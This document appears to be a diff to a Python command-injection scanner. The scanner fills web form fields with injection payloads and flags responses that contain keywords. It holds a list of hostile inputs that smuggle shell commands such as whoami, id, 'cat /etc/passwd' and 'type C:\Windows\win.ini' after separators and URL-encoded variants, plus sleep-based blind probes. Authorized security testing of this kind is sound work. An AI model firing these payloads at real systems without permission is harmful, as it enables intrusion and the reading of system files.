@@ -1,28 +1,28 @@
 import requests
 from bs4 import BeautifulSoup
-from urllib.parse import urljoin
+from urllib.parse import urljoin, urlparse
 
 payloads = [
-    "127.0.0.1 && whoami",
-    "127.0.0.1 && id",
-    "127.0.0.1 && uname -a",
-    "127.0.0.1 && ls",
-    "127.0.0.1 && cat /etc/passwd",
-    "127.0.0.1; whoami",
-    "127.0.0.1 | whoami",
-    "127.0.0.1 `whoami`",  
-    "127.0.0.1 && echo vulnerable",
-    "127.0.0.1 && sleep 5",  # time delay (blind injection)
-    "127.0.0.1 & whoami",
-    "127.0.0.1 & dir",
-    "127.0.0.1 & echo vulnerable",
-    "127.0.0.1 & type C:\\Windows\\win.ini",
-    "127.0.0.1 | whoami",
-    "127.0.0.1 & timeout 5",  # time delay (Windows)
-    "127.0.0.1%26%26whoami",    # && URL encoded
-    "127.0.0.1%3Bwhoami",       # ; URL encoded
-    "127.0.0.1%7Cwhoami",       # | URL encoded
-    "127.0.0.1%60whoami%60"     # backtick encoded
+    "{target} && whoami",
+    "{target} && id",
+    "{target} && uname -a",
+    "{target} && ls",
+    "{target} && cat /etc/passwd",
+    "{target}; whoami",
+    "{target} | whoami",
+    "{target} `whoami`",
+    "{target} && echo vulnerable",
+    "{target} && sleep 5",
+    "{target} & whoami",
+    "{target} & dir",
+    "{target} & echo vulnerable",
+    "{target} & type C:\\Windows\\win.ini",
+    "{target} | whoami",
+    "{target} & timeout 5",
+    "{target}%26%26whoami",
+    "{target}%3Bwhoami",
+    "{target}%7Cwhoami",
+    "{target}%60whoami%60"
 ]
 
 keywords = [
@@ -31,9 +31,17 @@ keywords = [
     "system32", "admin", "whoami", "echo vulnerable"
 ]
 
+def _safe_text_snippet(text, length=300):
+    if not text:
+        return ""
+    return text[:length].replace('\n', ' ').strip()
 
 def check_cmd_injection(url):
+    
     results = {}
+
+    parsed = urlparse(url)
+    target = parsed.netloc or parsed.path 
 
     try:
         page = requests.get(url, timeout=5)
@@ -55,34 +63,58 @@ def check_cmd_injection(url):
 
         inputs = form.find_all("input")
 
-        for load in payloads:
+        for tpl in payloads:
+
+            load = tpl.format(target=target)
+
             data = {}
             for input_tag in inputs:
                 name = input_tag.get("name")
-                if name and input_tag.get("type") != "submit": #so that it doesnt put payload in submit field
+                if name and input_tag.get("type") not in ("submit", "button"):
                     data[name] = load
+
+            test_result = {
+                "status_code": None,
+                "vulnerable": False,
+                "reason": "Request Failed",
+                "snippet": ""
+            }
 
             try:
                 if method == "post":
                     response = requests.post(submit_url, data=data, timeout=7)
                 else:
                     response = requests.get(submit_url, params=data, timeout=7)
-            except requests.RequestException as e:
-                results[load] = f"Error: {e}"
-                continue
+                
 
-            if response.status_code == 200:
-                response_text = response.text
-                isPresent = False
-                for i in keywords:
-                    if(i.lower() in response_text.lower()):
-                        isPresent = True
-                        break
-                if(isPresent):
-                    results[load]="Potential Vulnerability"
+                if response.status_code == 200:
+                    response_text = response.text
+                    snippet = _safe_text_snippet(response_text, 300)
+                    
+                    isPresent = False
+                    reason = "No keyword match found"
+                    
+                    for i in keywords:
+                        if i.lower() in response_text.lower():
+                            isPresent = True
+                            reason = f"Keyword match: '{i}'"
+                            break
+                    
+                    if isPresent:
+                        test_result["vulnerable"] = True
+                        test_result["reason"] = f"Potential Vulnerability: {reason}"
+                    else:
+                        test_result["reason"] = "No direct evidence found (Status 200)"
+
+                    test_result["snippet"] = snippet
                 else:
-                    results[load]="No"        
-            else:
-                results[load] = f"Error: {response.status_code}"
+                    test_result["reason"] = f"Non-200 Status Code: {response.status_code}"
+                    test_result["snippet"] = _safe_text_snippet(response.text, 300)
+
+            except requests.RequestException as e:
+                test_result["reason"] = f"Request Error: {e}"
+
+            results[load] = test_result
 
     return results
+
